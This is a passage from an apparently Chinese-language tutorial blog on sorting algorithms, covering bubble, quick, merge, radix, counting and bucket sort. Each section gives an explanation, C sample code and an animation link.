<h5 id="2-动图演示-3"><a href="#2-动图演示-3" class="headerlink" title="2. 动图演示"></a>2. 动图演示</h5><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/Sorting_shellsort_anim.gif" alt=""></p>
<h3 id="（三）交换排序"><a href="#（三）交换排序" class="headerlink" title="（三）交换排序"></a>（三）交换排序</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><p>冒泡排序（Bubble Sort）也是一种简单直观的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果他们的顺序错误就把他们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢”浮” 到数列的顶端。</p>
<p>作为最简单的排序算法之一，冒泡排序给我的感觉就像 Abandon 在单词书里出现的感觉一样，每次都在第一页第一位，所以最熟悉。冒泡排序还有一种优化算法，就是立一个 flag，当在一趟序列遍历中元素没有发生交换，则证明该序列已经有序。但这种改进对于提升性能来说并没有什么太大作用。</p>
<h5 id="1-算法步骤-4"><a href="#1-算法步骤-4" class="headerlink" title="1. 算法步骤"></a>1. 算法步骤</h5><p>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</p>
<p>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</p>
<p>针对所有的元素重复以上的步骤，<font color="#ff0000">除了最后一个</font>。</p>
<p>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bubble_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> &#123;</span><br><span class="line">        <span class="type">int</span> i, j, temp;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++)</span><br><span class="line">                        <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                                temp = arr[j];</span><br><span class="line">                                arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                                arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">                        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> arr[] = &#123; <span class="number">22</span>, <span class="number">34</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">82</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">64</span>, <span class="number">35</span>, <span class="number">9</span>, <span class="number">70</span> &#125;;</span><br><span class="line">        <span class="type">int</span> len = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">        bubble_sort(arr, len);</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-动图演示-4"><a href="#2-动图演示-4" class="headerlink" title="2. 动图演示"></a>2. 动图演示</h5><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/bubbleSort.gif" alt=""></p>
<h5 id="3-最快或最慢的时候"><a href="#3-最快或最慢的时候" class="headerlink" title="3. 最快或最慢的时候"></a>3. 最快或最慢的时候</h5><ul>
<li>当输入的数据已经是正序时（都已经是正序了，我还要你冒泡排序有何用啊）。</li>
<li>当输入的数据是反序时（写一个 for 循环反序输出数据不就行了，干嘛要用你冒泡排序呢，我是闲的吗）。<h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4>快速排序是由东尼·霍尔所发展的一种排序算法。在平均状况下，排序 n 个项目要 Ο(nlogn) 次比较。在最坏状况下则需要 Ο(n2) 次比较，但这种状况并不常见。事实上，快速排序通常明显比其他 Ο(nlogn) 算法更快，因为它的内部循环（inner loop）可以在大部分的架构上很有效率地被实现出来。</li>
</ul>
<p>快速排序使用分治法（Divide and conquer）策略来把一个串行（list）分为两个子串行（sub-lists）。</p>
<p>快速排序又是一种分而治之思想在排序算法上的典型应用。本质上来看，快速排序应该算是在冒泡排序基础上的递归分治法。</p>
<p>快速排序的名字起的是简单粗暴，因为一听到这个名字你就知道它存在的意义，就是快，而且效率高！它是处理大数据最快的排序算法之一了。虽然 Worst Case 的时间复杂度达到了 O(n²)，但是人家就是优秀，在大多数情况下都比平均时间复杂度为 O(n logn) 的排序算法表现要更好，可是这是为什么呢，我也不知道。好在我的强迫症又犯了，查了 N 多资料终于在《算法艺术与信息学竞赛》上找到了满意的答案：</p>
<blockquote>
<p>快速排序的最坏运行情况是 O(n²)，比如说顺序数列的快排。但它的平摊期望时间是 O(nlogn)，且 O(nlogn) 记号中隐含的常数因子很小，比复杂度稳定等于 O(nlogn) 的归并排序要小很多。所以，对绝大多数顺序性较弱的随机数列而言，快速排序总是优于归并排序。</p>
</blockquote>
<h5 id="1-算法步骤-5"><a href="#1-算法步骤-5" class="headerlink" title="1. 算法步骤"></a>1. 算法步骤</h5><ul>
<li><p>从数列中挑出一个元素，称为 “基准”（pivot）;</p>
</li>
<li><p>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；</p>
</li>
<li><p>递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序；</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Range</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> start, end;</span><br><span class="line">&#125; Range;</span><br><span class="line"></span><br><span class="line">Range <span class="title function_">new_Range</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> e)</span> &#123;</span><br><span class="line">    Range r;</span><br><span class="line">    r.start = s;</span><br><span class="line">    r.end = e;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *x, <span class="type">int</span> *y)</span> &#123;</span><br><span class="line">    <span class="type">int</span> t = *x;</span><br><span class="line">    *x = *y;</span><br><span class="line">    *y = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">quick_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">// 避免len等於負值時引發段錯誤（Segment Fault）</span></span><br><span class="line">    <span class="comment">// r[]模擬列表,p為數量,r[p++]為push,r[--p]為pop且取得元素</span></span><br><span class="line">    Range r[len];</span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line">    r[p++] = new_Range(<span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (p) &#123;</span><br><span class="line">        Range range = r[--p];</span><br><span class="line">        <span class="keyword">if</span> (range.start &gt;= range.end)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="type">int</span> mid = arr[(range.start + range.end) / <span class="number">2</span>]; <span class="comment">// 選取中間點為基準點</span></span><br><span class="line">        <span class="type">int</span> left = range.start, right = range.end;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (arr[left] &lt; mid) ++left;   <span class="comment">// 檢測基準點左側是否符合要求</span></span><br><span class="line">            <span class="keyword">while</span> (arr[right] &gt; mid) --right; <span class="comment">//檢測基準點右側是否符合要求</span></span><br><span class="line">            <span class="keyword">if</span> (left &lt;= right) &#123;</span><br><span class="line">                swap(&amp;arr[left], &amp;arr[right]);</span><br><span class="line">                left++;</span><br><span class="line">                right--;               <span class="comment">// 移動指針以繼續</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (left &lt;= right);</span><br><span class="line">        <span class="keyword">if</span> (range.start &lt; right) r[p++] = new_Range(range.start, right);</span><br><span class="line">        <span class="keyword">if</span> (range.end &gt; left) r[p++] = new_Range(left, range.end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">_________________________________________________________________________</span><br><span class="line"></span><br><span class="line"><span class="comment">//递归法</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *x, <span class="type">int</span> *y)</span> &#123;</span><br><span class="line">    <span class="type">int</span> t = *x;</span><br><span class="line">    *x = *y;</span><br><span class="line">    *y = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">quick_sort_recursive</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (start &gt;= end)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> mid = arr[end];</span><br><span class="line">    <span class="type">int</span> left = start, right = end - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">while</span> (arr[left] &lt; mid &amp;&amp; left &lt; right)</span><br><span class="line">            left++;</span><br><span class="line">        <span class="keyword">while</span> (arr[right] &gt;= mid &amp;&amp; left &lt; right)</span><br><span class="line">            right--;</span><br><span class="line">        swap(&amp;arr[left], &amp;arr[right]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (arr[left] &gt;= arr[end])</span><br><span class="line">        swap(&amp;arr[left], &amp;arr[end]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        left++;</span><br><span class="line">    <span class="keyword">if</span> (left)</span><br><span class="line">        quick_sort_recursive(arr, start, left - <span class="number">1</span>);</span><br><span class="line">    quick_sort_recursive(arr, left + <span class="number">1</span>, end);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">quick_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    quick_sort_recursive(arr, <span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-动图演示-5"><a href="#2-动图演示-5" class="headerlink" title="2. 动图演示"></a>2. 动图演示</h5><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/quickSort.gif" alt=""></p>
<h3 id="（四）归并排序"><a href="#（四）归并排序" class="headerlink" title="（四）归并排序"></a>（四）归并排序</h3><p>归并排序（Merge sort）是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。</p>
<p>作为一种典型的分而治之思想的算法应用，归并排序的实现由两种方法：</p>
<ul>
<li>自上而下的递归（所有递归的方法都可以用迭代重写，所以就有了第 2 种方法）；</li>
<li>自下而上的迭代；</li>
</ul>
<p>和选择排序一样，归并排序的性能不受输入数据的影响，但表现比选择排序好的多，因为始终都是 O(nlogn) 的时间复杂度。代价是需要额外的内存空间。</p>
<h4 id="1-算法步骤-6"><a href="#1-算法步骤-6" class="headerlink" title="1. 算法步骤"></a>1. 算法步骤</h4><ul>
<li><p>申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列；</p>
</li>
<li><p>设定两个指针，最初位置分别为两个已经排序序列的起始位置；</p>
</li>
<li><p>比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置；</p>
</li>
<li><p>重复步骤 3 直到某一指针达到序列尾；</p>
</li>
<li><p>将另一序列剩下的所有元素直接复制到合并序列尾。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x &lt; y ? x : y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">merge_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> *a = arr;</span><br><span class="line">    <span class="type">int</span> *b = (<span class="type">int</span> *) <span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="type">int</span> seg, start;</span><br><span class="line">    <span class="keyword">for</span> (seg = <span class="number">1</span>; seg &lt; len; seg += seg) &#123;</span><br><span class="line">        <span class="keyword">for</span> (start = <span class="number">0</span>; start &lt; len; start += seg * <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="type">int</span> low = start, mid = min(start + seg, len), high = min(start + seg * <span class="number">2</span>, len);</span><br><span class="line">            <span class="type">int</span> k = low;</span><br><span class="line">            <span class="type">int</span> start1 = low, end1 = mid;</span><br><span class="line">            <span class="type">int</span> start2 = mid, end2 = high;</span><br><span class="line">            <span class="keyword">while</span> (start1 &lt; end1 &amp;&amp; start2 &lt; end2)</span><br><span class="line">                b[k++] = a[start1] &lt; a[start2] ? a[start1++] : a[start2++];</span><br><span class="line">            <span class="keyword">while</span> (start1 &lt; end1)</span><br><span class="line">                b[k++] = a[start1++];</span><br><span class="line">            <span class="keyword">while</span> (start2 &lt; end2)</span><br><span class="line">                b[k++] = a[start2++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> *temp = a;</span><br><span class="line">        a = b;</span><br><span class="line">        b = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (a != arr) &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">            b[i] = a[i];</span><br><span class="line">        b = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-动图演示-6"><a href="#2-动图演示-6" class="headerlink" title="2. 动图演示"></a>2. 动图演示</h4><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/mergeSort.gif" alt=""></p>
<h3 id="（五）基数排序"><a href="#（五）基数排序" class="headerlink" title="（五）基数排序"></a>（五）基数排序</h3><p>将整数按位数切割成不同的数字，然后按每个位数分别比较。基数排序的方式可以采用LSD（Least significant digital）或MSD（Most significant digital），LSD的排序方式由键值的最右边开始，而MSD则相反，由键值的最左边开始。</p>
<ul>
<li><strong>MSD</strong>：先从高位开始进行排序，在每个关键字上，可采用计数排序</li>
<li><strong>LSD</strong>：先从低位开始进行排序，在每个关键字上，可采用桶排序<h4 id="1-算法步骤-7"><a href="#1-算法步骤-7" class="headerlink" title="1. 算法步骤"></a>1. 算法步骤</h4></li>
<li>将所有待比较数值（正整数）统一为同样的数位长度，数位较短的数前面补零。</li>
<li>从最低位开始，依次进行一次排序。</li>
<li>这样从最低位排序一直到最高位排序完成以后, 数列就变成一个有序序列。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 20</span></span><br><span class="line"><span class="comment">//#define SHOWPASS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BASE 10</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">radixsort</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i, b[MAX], m = a[<span class="number">0</span>], <span class="built_in">exp</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a[i] &gt; m) &#123;</span><br><span class="line">      m = a[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (m / <span class="built_in">exp</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">int</span> bucket[BASE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">      bucket[(a[i] / <span class="built_in">exp</span>) % BASE]++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; BASE; i++) &#123;</span><br><span class="line">      bucket[i] += bucket[i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">      b[--bucket[(a[i] / <span class="built_in">exp</span>) % BASE]] = a[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">      a[i] = b[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exp</span> *= BASE;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHOWPASS</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nPASS   : &quot;</span>);</span><br><span class="line">    print(a, n);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> arr[MAX];</span><br><span class="line">  <span class="type">int</span> i, n;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter total elements (n &lt;= %d) : &quot;</span>, MAX);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  n = n &lt; MAX ? n : MAX;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter %d Elements : &quot;</span>, n);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nARRAY  : &quot;</span>);</span><br><span class="line">  print(&amp;arr[<span class="number">0</span>], n);</span><br><span class="line"></span><br><span class="line">  radixsort(&amp;arr[<span class="number">0</span>], n);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nSORTED : &quot;</span>);</span><br><span class="line">  print(&amp;arr[<span class="number">0</span>], n);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-LSD-基数排序动图演示"><a href="#2-LSD-基数排序动图演示" class="headerlink" title="2. LSD 基数排序动图演示"></a>2. LSD 基数排序动图演示</h4><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/radixSort.gif" alt=""></p>
<h4 id="3-基数排序-vs-计数排序-vs-桶排序"><a href="#3-基数排序-vs-计数排序-vs-桶排序" class="headerlink" title="3. 基数排序 vs 计数排序 vs 桶排序"></a>3. 基数排序 vs 计数排序 vs 桶排序</h4><p>这三种排序算法都利用了桶的概念，但对桶的使用方法上有明显差异：</p>
<ul>
<li>基数排序：根据键值的每位数字来分配桶；</li>
<li>计数排序：每个桶只存储单一键值；</li>
<li>桶排序：每个桶存储一定范围的数值；<h3 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h3>计数排序的核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。<h4 id="1-计数排序的特征"><a href="#1-计数排序的特征" class="headerlink" title="1. 计数排序的特征"></a>1. 计数排序的特征</h4>当输入的元素是 n 个 0 到 k 之间的整数时，它的运行时间是 Θ(n + k)。计数排序不是比较排序，排序的速度快于任何比较排序算法。</li>
</ul>
<p>由于用来计数的数组C的长度取决于待排序数组中数据的范围（等于待排序数组的最大值与最小值的差加上1），这使得计数排序对于数据范围很大的数组，需要大量时间和内存。例如：计数排序是用来排序0到100之间的数字的最好的算法，但是它不适合按字母顺序排序人名。但是，计数排序可以用在基数排序中的算法来排序数据范围很大的数组。</p>
<p>通俗地理解，例如有 10 个年龄不同的人，统计出有 8 个人的年龄比 A 小，那 A 的年龄就排在第 9 位,用这个方法可以得到其他每个人的位置,也就排好了序。当然，年龄有重复时需要特殊处理（保证稳定性），这就是为什么最后要反向填充目标数组，以及将每个数字的统计减去 1 的原因。<br> 算法的步骤如下：</p>
<ul>
<li>（1）找出待排序的数组中最大和最小的元素</li>
<li>（2）统计数组中每个值为i的元素出现的次数，存入数组C的第i项</li>
<li>（3）对所有的计数累加（从C中的第一个元素开始，每一项和前一项相加）</li>
<li>（4）反向填充目标数组：将每个元素i放在新数组的第C(i)项，每放一个元素就将C(i)减去1</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_arr</span><span class="params">(<span class="type">int</span> *arr, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, arr[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>, arr[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">counting_sort</span><span class="params">(<span class="type">int</span> *ini_arr, <span class="type">int</span> *sorted_arr, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> *count_arr = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">100</span>);</span><br><span class="line">        <span class="type">int</span> i, j, k;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">100</span>; k++)</span><br><span class="line">                count_arr[k] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">                count_arr[ini_arr[i]]++;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt; <span class="number">100</span>; k++)</span><br><span class="line">                count_arr[k] += count_arr[k - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (j = n; j &gt; <span class="number">0</span>; j--)</span><br><span class="line">                sorted_arr[--count_arr[ini_arr[j - <span class="number">1</span>]]] = ini_arr[j - <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">free</span>(count_arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> *arr = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * n);</span><br><span class="line">        <span class="type">int</span> *sorted_arr = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * n);</span><br><span class="line">        srand(time(<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">                arr[i] = rand() % <span class="number">100</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ini_array: &quot;</span>);</span><br><span class="line">        print_arr(arr, n);</span><br><span class="line">        counting_sort(arr, sorted_arr, n);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sorted_array: &quot;</span>);</span><br><span class="line">        print_arr(sorted_arr, n);</span><br><span class="line">        <span class="built_in">free</span>(arr);</span><br><span class="line">        <span class="built_in">free</span>(sorted_arr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-动图演示-7"><a href="#2-动图演示-7" class="headerlink" title="2. 动图演示"></a>2. 动图演示</h4><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/countingSort.gif" alt=""></p>
<h3 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h3><p>假设一种场景，对 {5, 2, 1, 4, 3} 进行升序排序，桶排序算法的实现思路是：</p>
<ul>
<li>准备 5 个桶，从 1~5 对它们进行编号；</li>
<li>将待排序序列的各个元素放置到相同编号的桶中；</li>
<li>从 1 号桶开始，依次获取桶中放置的元素，得到的就是一个升序序列。<br>整个实现思路如下图所示：</li>
</ul>
<p><img src="https://c.biancheng.net/uploads/allimg/210820/2-210R0132U3Q1.gif" alt=""></p>
<p>桶排序算法中，待排序的数据量和桶的数量并不一定是简单的“一对一”的关系，更多场景中是“多对一”的关系，例如，使用桶排序算法对 {11, 9, 21, 8, 17, 19, 13, 1, 24, 12} 进行升序排序，实现过程如下图所示：</p>
<p><img src="https://c.biancheng.net/uploads/allimg/210820/2-210R013291B38.gif" alt=""></p>
<p>待排序序列中有 10 个元素，但算法中只用了 5 个桶，因此有些桶需要存放多个元素。实际场景中，我们可以自定义各个桶存放元素的区间（范围），比如上图中第一个桶存放 [0,5) 区间内的元素，第二个桶存放[6,10) 之间的元素。</p>
<p>当存在“一个桶中有多个元素”的情况时，要先使用合适的排序算法对各个痛内的元素进行排序，然后再根据桶的次序逐一取出所有元素，最终得到的才是一个有序序列。</p>
<p>总之，桶排序算法的实现思路是：将待排序序列中的元素根据规则分组，每一组采用快排、插入排序等算法进行排序，然后再按照次序将所有元素合并，就可以得到一个有序序列。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 7   <span class="comment">// 待排序序列中的元素个数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NBUCKET 6  <span class="comment">// 桶的数量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERVAL 10  <span class="comment">// 每个桶能存放的元素个数</span></span></span><br><span class="line"><span class="comment">//建立桶</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="type">float</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">BucketSort</span><span class="params">(<span class="type">float</span> arr[])</span>;</span><br><span class="line"><span class="keyword">struct</span> Node *<span class="title function_">InsertionSort</span><span class="params">(<span class="keyword">struct</span> Node *<span class="built_in">list</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">float</span> arr[])</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">float</span> <span class="built_in">array</span>[N] = &#123; <span class="number">0.42</span>, <span class="number">0.32</span>, <span class="number">0.23</span>, <span class="number">0.52</span>, <span class="number">0.25</span>, <span class="number">0.47</span>, <span class="number">0.51</span> &#125;;</span><br><span class="line">    BucketSort(<span class="built_in">array</span>);</span><br><span class="line">    print(<span class="built_in">array</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 